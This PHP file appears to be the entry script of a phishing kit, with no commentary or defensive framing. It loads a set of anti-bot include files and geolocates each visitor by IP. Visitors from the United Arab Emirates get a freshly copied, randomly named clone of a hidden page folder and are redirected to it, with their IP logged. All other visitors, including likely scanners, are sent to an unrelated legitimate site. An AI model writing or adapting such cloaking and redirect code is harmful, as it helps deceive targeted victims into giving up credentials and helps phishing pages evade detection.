<?php


/// PURECODE
include "wc.php";
require 'superd/anti1.php';
require 'superd/anti2.php';
require 'superd/anti3.php';
require 'superd/anti4.php';
require 'superd/anti5.php';
require 'superd/anti6.php';
require 'superd/anti7.php';
require 'superd/anti8.php';
require 'superd/anti9.php';
require 'superd/anti10.php';

$ip = $_SERVER['REMOTE_ADDR'];
$COUNTRY = getCountryFromIP($ip, " NamE ");
$hostname = gethostbyaddr($ip);
$TIME = date("d F Y H:i:s");



if ( $COUNTRY == "United Arab Emirates" ) { 
    
    $random = rand(0,100000000000);
$DIR    = substr(md5($random), 15);
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="rwoaopt102154s";
recurse_copy( $home, $DIR );
header("location:$DIR");

            $ip = getenv("REMOTE_ADDR");
            $file = fopen("VUsr.superd","a");
            fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
            
      }else {
           @header("Location: https://digitalpersonas.com");
           
            $ip = getenv("REMOTE_ADDR");
            $file = fopen("boOTS.superd","a");
            fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;
      }
      


?>
